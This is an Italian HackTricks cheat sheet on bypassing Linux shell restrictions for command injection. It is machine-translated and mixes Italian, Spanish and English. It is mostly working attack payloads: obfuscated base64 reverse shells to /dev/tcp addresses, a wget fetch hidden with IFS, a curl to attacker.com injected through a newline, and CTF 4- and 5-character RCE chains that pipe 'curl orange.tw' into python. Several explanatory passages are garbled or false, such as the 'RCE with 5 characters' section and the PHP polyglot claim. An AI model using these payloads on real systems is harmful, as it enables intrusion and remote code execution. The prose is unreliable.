# Bypass delle restrizioni di Linux

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) su GitHub.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e **automatizzare facilmente flussi di lavoro** supportati dagli strumenti comunitari **più avanzati al mondo**.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Bypass delle Limitazioni Comuni

### Reverse Shell
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Shell inversa breve

Una shell inversa breve es una técnica utilizada para establecer una conexión remota a un sistema comprometido y obtener acceso a la línea de comandos. Esta técnica es útil para evadir restricciones de Bash y ejecutar comandos en un sistema Linux.

Aquí hay un ejemplo de cómo crear una shell inversa breve utilizando el comando `bash`:

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

En este ejemplo, el comando `bash` se utiliza para iniciar una shell interactiva (`-i`). La salida estándar (`>&`) se redirige al dispositivo `/dev/tcp/10.0.0.1/4444`, que es la dirección IP y el puerto del sistema atacante. La entrada estándar (`0>&1`) también se redirige a la salida estándar, lo que permite la interacción con la shell remota.

Una vez que se establece la conexión, el atacante puede ejecutar comandos en el sistema comprometido y obtener acceso a la línea de comandos remota.

Es importante tener en cuenta que esta técnica puede ser detectada por sistemas de seguridad y firewalls, por lo que se recomienda utilizarla con precaución y solo en entornos controlados.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Bypassare percorsi e parole vietate

Sometimes, during a penetration test, you may encounter restrictions on certain paths or words that are forbidden by the system. In such cases, you can try to bypass these restrictions using various techniques. Here are a few methods you can use:

#### 1. Using alternative paths

If a specific path is restricted, you can try using alternative paths to access the desired location. For example, instead of using the `/bin/bash` path, you can try using `/usr/bin/bash` or `/usr/local/bin/bash`. By trying different paths, you may be able to find one that is not restricted.

#### 2. Using symbolic links

Symbolic links can be used to bypass path restrictions. You can create a symbolic link to the desired location and then access it using the link. For example, if the path `/bin/bash` is restricted, you can create a symbolic link to it in a different location, such as `/tmp/bash`, and then access `/tmp/bash` instead.

#### 3. Using environment variables

Environment variables can also be used to bypass path restrictions. You can set an environment variable to point to the desired location and then execute the restricted command using the variable. For example, you can set the `PATH` variable to include the desired path and then execute the command using `$(command)` syntax.

#### 4. Using command substitution

Command substitution can be used to bypass restrictions on forbidden words. You can enclose the forbidden word within backticks or `$()` to execute it as a command. For example, if the word `rm` is forbidden, you can use `` `rm` `` or `$(rm)` to execute the `rm` command.

These are just a few techniques you can use to bypass path and word restrictions. It's important to note that these methods may not always work, as system administrators may have implemented additional security measures. Therefore, it's crucial to thoroughly understand the system and its restrictions before attempting to bypass them.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Bypassare gli spazi vietati

Sometimes, when trying to execute commands with spaces in them, you may encounter restrictions that prevent the execution. However, there are a few techniques you can use to bypass these restrictions.

A volte, quando si cercano di eseguire comandi che contengono spazi, è possibile incontrare restrizioni che ne impediscono l'esecuzione. Tuttavia, esistono alcune tecniche che è possibile utilizzare per aggirare queste restrizioni.

#### Using quotes

One way to bypass forbidden spaces is by using quotes. By enclosing the command within quotes, you can ensure that the entire command is treated as a single argument.

Un modo per aggirare gli spazi vietati è utilizzare le virgolette. Racchiudendo il comando tra virgolette, è possibile garantire che l'intero comando venga trattato come un singolo argomento.

```bash
$ ls "file with spaces.txt"
```

#### Using backslashes

Another technique is to use backslashes to escape the spaces. By placing a backslash before each space, you can indicate that the space should be treated as part of the argument, rather than a delimiter.

Un'altra tecnica consiste nell'utilizzare il carattere di escape (\) per escludere gli spazi. Posizionando un carattere di escape prima di ogni spazio, è possibile indicare che lo spazio deve essere trattato come parte dell'argomento, anziché come delimitatore.

```bash
$ ls file\ with\ spaces.txt
```

#### Using wildcards

If you are dealing with multiple files that have spaces in their names, you can use wildcards to bypass the restrictions. By using the `*` wildcard, you can match any character or sequence of characters, including spaces.

Se si hanno a che fare con più file che hanno spazi nei loro nomi, è possibile utilizzare i caratteri jolly per aggirare le restrizioni. Utilizzando il carattere jolly (*) è possibile corrispondere a qualsiasi carattere o sequenza di caratteri, inclusi gli spazi.

```bash
$ ls file*spaces.txt
```

By using these techniques, you can bypass restrictions on spaces and successfully execute commands that contain spaces in their arguments.

Utilizzando queste tecniche, è possibile aggirare le restrizioni sugli spazi ed eseguire con successo comandi che contengono spazi nei loro argomenti.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Bypass backslash and slash

### Bypassare il backslash e la barra

To bypass restrictions that prevent the use of backslashes and slashes in commands, you can use alternative characters or encoding techniques.

Per bypassare le restrizioni che impediscono l'uso di backslash e barre nelle comandi, è possibile utilizzare caratteri alternativi o tecniche di codifica.

#### Alternative characters

#### Caratteri alternativi

Instead of using a backslash (\) or a slash (/), you can try using other characters that have similar functionality. Some examples include:

Invece di utilizzare un backslash (\) o una barra (/), è possibile provare ad utilizzare altri caratteri che hanno una funzionalità simile. Alcuni esempi includono:

- The pipe character (|): This can be used as a substitute for a slash in some cases.

- Il carattere pipe (|): Questo può essere utilizzato come sostituto della barra in alcuni casi.

- The semicolon character (;): This can be used as a substitute for a backslash in some cases.

- Il carattere punto e virgola (;): Questo può essere utilizzato come sostituto del backslash in alcuni casi.

#### Encoding techniques

#### Tecniche di codifica

Another approach is to use encoding techniques to represent the backslash or slash in a different format. Some common encoding techniques include:

Un altro approccio consiste nell'utilizzare tecniche di codifica per rappresentare il backslash o la barra in un formato diverso. Alcune tecniche di codifica comuni includono:

- URL encoding: Use the `%5C` code for a backslash and `%2F` code for a slash.

- Codifica URL: Utilizzare il codice `%5C` per il backslash e il codice `%2F` per la barra.

- Unicode encoding: Use the `\u005C` code for a backslash and `\u002F` code for a slash.

- Codifica Unicode: Utilizzare il codice `\u005C` per il backslash e il codice `\u002F` per la barra.

By using alternative characters or encoding techniques, you can bypass restrictions on backslashes and slashes in commands and execute the desired actions.

Utilizzando caratteri alternativi o tecniche di codifica, è possibile bypassare le restrizioni sui backslash e sulle barre nei comandi ed eseguire le azioni desiderate.
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Bypassare le pipe

Le pipe sono un meccanismo molto utile in Linux per concatenare comandi e far sì che l'output di uno venga utilizzato come input per un altro. Tuttavia, in alcuni casi potresti incontrare restrizioni che impediscono l'uso delle pipe. Fortunatamente, esistono alcune tecniche per bypassare queste restrizioni e continuare a utilizzare le pipe.

#### Utilizzare process substitution

Una tecnica comune per bypassare le restrizioni delle pipe è utilizzare la sostituzione dei processi. Questo metodo consente di eseguire un comando e utilizzare il suo output come input per un altro comando, senza dover utilizzare direttamente le pipe.

Per utilizzare la sostituzione dei processi, è possibile utilizzare la seguente sintassi:

```bash
command1 <(command2)
```

In questo modo, l'output di `command2` verrà trattato come un file temporaneo e utilizzato come input per `command1`.

#### Utilizzare un file temporaneo

Un'altra tecnica per bypassare le restrizioni delle pipe è utilizzare un file temporaneo come ponte tra i comandi. Puoi creare un file temporaneo, scrivere l'output del primo comando su di esso e quindi utilizzare il contenuto del file come input per il secondo comando.

Ecco come puoi fare:

```bash
command1 > /tmp/tempfile
command2 < /tmp/tempfile
```

In questo esempio, l'output di `command1` viene scritto nel file temporaneo `/tmp/tempfile` e quindi viene utilizzato come input per `command2`.

#### Utilizzare un subshell

Un'altra tecnica per bypassare le restrizioni delle pipe è utilizzare un subshell. Un subshell è un ambiente separato in cui puoi eseguire comandi senza influire sull'ambiente principale.

Per utilizzare un subshell, puoi utilizzare la seguente sintassi:

```bash
(command1) | command2
```

In questo modo, il comando `command1` viene eseguito nel subshell e il suo output viene utilizzato come input per `command2`.

Queste sono solo alcune delle tecniche comuni per bypassare le restrizioni delle pipe in Linux. Sperimenta con queste tecniche e adatta il tuo approccio in base alle tue esigenze specifiche.
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Bypass con codifica esadecimale

Sometimes, certain characters or commands may be restricted or blocked by a system. In such cases, you can bypass these restrictions by using hex encoding.

A volte, alcuni caratteri o comandi possono essere limitati o bloccati da un sistema. In tali casi, è possibile aggirare queste restrizioni utilizzando la codifica esadecimale.

For example, if the `echo` command is restricted, you can use its hex representation `\x65\x63\x68\x6f` instead. This will be interpreted as `echo` by the system, allowing you to execute the command.

Ad esempio, se il comando `echo` è limitato, è possibile utilizzare la sua rappresentazione esadecimale `\x65\x63\x68\x6f` al suo posto. Questo verrà interpretato come `echo` dal sistema, consentendoti di eseguire il comando.

To use hex encoding, you can use the `printf` command with the `-v` option. For example, to execute the `ls` command, you can use the following command:

Per utilizzare la codifica esadecimale, è possibile utilizzare il comando `printf` con l'opzione `-v`. Ad esempio, per eseguire il comando `ls`, è possibile utilizzare il seguente comando:

```bash
printf -v command "%b" "\x6c\x73"
$command
```

This will execute the `ls` command, even if it is restricted or blocked.

Questo eseguirà il comando `ls`, anche se è limitato o bloccato.
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### Bypass IP

Sometimes, during a penetration test, you may encounter restrictions that prevent you from accessing certain IP addresses. In such cases, you can try bypassing these restrictions using various techniques. Here are a few methods you can use:

#### 1. Proxy Servers

One way to bypass IP restrictions is by using proxy servers. Proxy servers act as intermediaries between your device and the target IP address, allowing you to access the restricted content. There are both free and paid proxy servers available, and you can configure your device to use them.

#### 2. VPN (Virtual Private Network)

Another effective method is to use a VPN. A VPN creates a secure and encrypted connection between your device and a remote server, which then accesses the restricted IP address on your behalf. This way, your actual IP address is masked, and you can bypass the restrictions.

#### 3. Tor Network

The Tor network is a decentralized network that allows anonymous communication. By using the Tor browser, your internet traffic is routed through multiple volunteer-operated servers, making it difficult to trace your IP address. This can help you bypass IP restrictions effectively.

#### 4. SSH Tunneling

SSH tunneling is a technique that allows you to create an encrypted tunnel between your device and a remote server. By forwarding your traffic through this tunnel, you can bypass IP restrictions. This method requires access to a remote server with SSH enabled.

#### 5. DNS Tunneling

DNS tunneling involves encapsulating non-DNS traffic within DNS packets. By doing so, you can bypass IP restrictions that only allow DNS traffic. This technique requires a DNS tunneling tool and a DNS server that allows custom queries.

These are just a few methods you can use to bypass IP restrictions. It's important to note that bypassing restrictions may be illegal or against the terms of service in certain situations. Always ensure you have proper authorization before attempting any bypassing techniques.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Esfiltrazione dei dati basata sul tempo

La tecnica di esfiltrazione dei dati basata sul tempo è un metodo utilizzato per trasferire informazioni sensibili da un sistema compromesso a un server remoto. Questo approccio sfrutta il ritardo tra l'invio dei pacchetti di dati per nascondere l'attività di esfiltrazione e rendere più difficile la rilevazione da parte dei sistemi di sicurezza.

#### Implementazione

Per implementare questa tecnica, è possibile utilizzare il comando `ping` per inviare pacchetti ICMP al server remoto. Ogni pacchetto può contenere una piccola porzione dei dati da esfiltrare. Il ritardo tra l'invio dei pacchetti può essere utilizzato per rappresentare i bit dei dati. Ad esempio, un ritardo di 1 secondo potrebbe rappresentare un bit 1, mentre un ritardo di 0,5 secondi potrebbe rappresentare un bit 0.

#### Esempio

Di seguito è riportato un esempio di come utilizzare questa tecnica per esfiltrare dati da un sistema compromesso:

1. Dividere i dati da esfiltrare in piccole porzioni.
2. Utilizzare il comando `ping` per inviare pacchetti ICMP al server remoto, utilizzando il ritardo appropriato per rappresentare i bit dei dati.
3. Sul server remoto, monitorare l'arrivo dei pacchetti ICMP e ricostruire i dati esfiltrati.

Questa tecnica può essere efficace per esfiltrare dati in modo discreto e sfuggire alla rilevazione. Tuttavia, è importante notare che può richiedere molto tempo per esfiltrare grandi quantità di dati utilizzando questa tecnica.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Ottenere caratteri dalle variabili di ambiente

In alcuni scenari di hacking, potresti trovarti di fronte a restrizioni che impediscono l'esecuzione di determinati comandi o l'accesso a determinate risorse. Tuttavia, potresti ancora essere in grado di ottenere informazioni sensibili, come password o chiavi di accesso, utilizzando le variabili di ambiente.

Le variabili di ambiente sono valori che possono essere impostati e recuperati dal sistema operativo. In Linux, puoi accedere alle variabili di ambiente utilizzando il comando `echo` seguito dal nome della variabile preceduto da un dollaro ($). Ad esempio, per ottenere il valore della variabile di ambiente `PATH`, puoi eseguire il seguente comando:

```bash
echo $PATH
```

Se la variabile di ambiente contiene caratteri sensibili, come una password, puoi ottenere i singoli caratteri utilizzando la sintassi `${variable:index:length}`. Ad esempio, per ottenere il terzo carattere della variabile di ambiente `PASSWORD`, puoi eseguire il seguente comando:

```bash
echo ${PASSWORD:2:1}
```

Questo ti restituirà il terzo carattere della password. Puoi modificare l'indice e la lunghezza per ottenere altri caratteri.

Tieni presente che questa tecnica funziona solo se hai accesso alle variabili di ambiente e se le variabili contengono le informazioni che stai cercando di ottenere.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### Esfiltrazione dei dati DNS

Potresti utilizzare **burpcollab** o [**pingb**](http://pingb.in) ad esempio.

### Funzioni integrate

Nel caso in cui non sia possibile eseguire funzioni esterne e si abbia accesso solo a un **set limitato di funzioni integrate per ottenere RCE**, ci sono alcuni trucchi utili per farlo. Di solito **non sarà possibile utilizzare tutte** le **funzioni integrate**, quindi è necessario **conoscere tutte le opzioni** per cercare di eludere la prigione. Idea da [**devploit**](https://twitter.com/devploit).\
Prima di tutto, controlla tutte le [**funzioni integrate della shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Quindi ecco alcune **raccomandazioni**:
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Iniezione di comandi poliglotta

Polyglot command injection is a technique used to bypass restrictions on command execution by injecting malicious commands that can be interpreted by multiple programming languages. This allows an attacker to execute arbitrary commands on a target system, even if the system is configured to restrict the use of certain commands or characters.

To perform a polyglot command injection, an attacker needs to identify a command that can be interpreted differently by different programming languages. This is typically achieved by using special characters or syntax that have different meanings in different languages.

For example, the following command can be interpreted as a valid command in both Bash and PHP:

```bash
echo 'Hello, World!'; //'; echo 'Hello, World!'
```

In Bash, the command will simply print "Hello, World!" to the console. However, in PHP, the command will execute two separate commands: the first one will print "Hello, World!" to the console, and the second one will execute the injected command.

By leveraging this technique, an attacker can bypass restrictions and execute arbitrary commands on a target system. It is important for system administrators to be aware of this vulnerability and implement proper input validation and command sanitization to prevent polyglot command injection attacks.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Bypassare potenziali regex

In alcuni casi, potresti incontrare restrizioni basate su espressioni regolari (regex) che limitano l'input accettato. Tuttavia, esistono alcune tecniche per aggirare queste restrizioni:

- **Utilizzare caratteri speciali**: Puoi provare ad utilizzare caratteri speciali come `*`, `+`, `?`, `.` o `|` per eludere le regex. Ad esempio, se una regex limita l'input a una stringa di lettere minuscole, puoi provare ad inserire un carattere speciale come `a*` per aggirare la restrizione.

- **Utilizzare caratteri di escape**: Se una regex limita l'input accettato, puoi provare ad utilizzare caratteri di escape come `\` per eludere la restrizione. Ad esempio, se una regex limita l'input a una stringa di numeri, puoi provare ad inserire un carattere di escape come `\d` per aggirare la restrizione.

- **Utilizzare sequenze di escape**: Alcune regex possono essere aggirate utilizzando sequenze di escape specifiche. Ad esempio, se una regex limita l'input a una stringa di lettere minuscole, puoi provare ad utilizzare la sequenza di escape `\x61` per rappresentare il carattere `a` e aggirare la restrizione.

- **Utilizzare caratteri unicode**: Se una regex limita l'input a una determinata gamma di caratteri, puoi provare ad utilizzare caratteri unicode per aggirare la restrizione. Ad esempio, se una regex limita l'input a lettere minuscole, puoi provare ad utilizzare il carattere unicode `\u0061` per rappresentare il carattere `a` e aggirare la restrizione.

Ricorda che queste tecniche possono variare a seconda del contesto e delle restrizioni specifiche imposte dalla regex.
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Il **Bashfuscator** è uno strumento che consente di rendere il codice Bash più difficile da comprendere e analizzare. Utilizzando tecniche di oscuramento, il Bashfuscator trasforma il codice Bash in una forma più complessa e criptata, rendendo difficile per gli attaccanti comprendere il suo funzionamento e scoprire eventuali vulnerabilità.

Il Bashfuscator può essere utilizzato per proteggere script Bash sensibili o per nascondere comandi e funzionalità specifiche. Tuttavia, è importante notare che il Bashfuscator non fornisce una protezione completa e può essere superato da attaccanti determinati.

Per utilizzare il Bashfuscator, è possibile seguire i seguenti passaggi:

1. Installare il Bashfuscator sul proprio sistema.
2. Eseguire il comando `bashfuscator` seguito dal nome del file di script Bash da oscurare.
3. Il Bashfuscator genererà un nuovo file di script Bash con il codice oscurato.
4. Eseguire il nuovo file di script oscurato utilizzando il comando `bash`.

È importante notare che l'uso del Bashfuscator potrebbe rendere il codice più difficile da leggere e mantenere. Pertanto, è consigliabile utilizzare questa tecnica solo quando necessario e con cautela.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### RCE con 5 caratteri

In alcuni scenari di hacking, potrebbe essere necessario eseguire comandi remoti su un sistema Linux con restrizioni di shell. Qui di seguito viene presentato un metodo per bypassare queste restrizioni utilizzando solo 5 caratteri.

```bash
$ echo $0
bash
$ exec /bin/bash
$ echo $0
bash
```

Inizialmente, controlliamo la shell corrente utilizzando il comando `echo $0`. Se la shell corrente è `bash`, possiamo eseguire il comando `exec /bin/bash` per avviare una nuova shell `bash`. Successivamente, verifichiamo nuovamente la shell corrente utilizzando `echo $0` e dovrebbe essere `bash`.

Con questo metodo, siamo in grado di bypassare le restrizioni di shell e ottenere l'esecuzione di comandi remoti su un sistema Linux.
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### RCE con 4 caratteri

In alcuni scenari di hacking, potresti trovarti di fronte a restrizioni che limitano il numero di caratteri che puoi utilizzare per eseguire comandi. Tuttavia, esistono ancora alcune opzioni per eseguire comandi remoti (RCE) utilizzando solo 4 caratteri.

Una delle tecniche più comuni è utilizzare il comando `echo` per eseguire il codice desiderato. Ad esempio, se vuoi eseguire il comando `ls`, puoi utilizzare il seguente comando:

```bash
echo ls | sh
```

In questo modo, il comando `ls` verrà eseguito. Puoi sostituire `ls` con qualsiasi altro comando che desideri eseguire.

Un'altra opzione è utilizzare il comando `eval` per eseguire il codice desiderato. Ad esempio, se vuoi eseguire il comando `id`, puoi utilizzare il seguente comando:

```bash
eval id
```

In questo modo, il comando `id` verrà eseguito. Puoi sostituire `id` con qualsiasi altro comando che desideri eseguire.

Ricorda che queste tecniche possono essere utilizzate solo se hai accesso a un terminale o a un'interfaccia che supporta l'esecuzione di comandi.
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Bypass di Read-Only/Noexec/Distroless

Se ti trovi all'interno di un filesystem con le protezioni di **sola lettura e noexec** o anche in un container distroless, ci sono comunque modi per **eseguire binari arbitrari, persino una shell!:**

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Bypass di Chroot e altre Jails

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## Riferimenti e Altro

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e **automatizzare workflow** con gli strumenti della comunità più avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
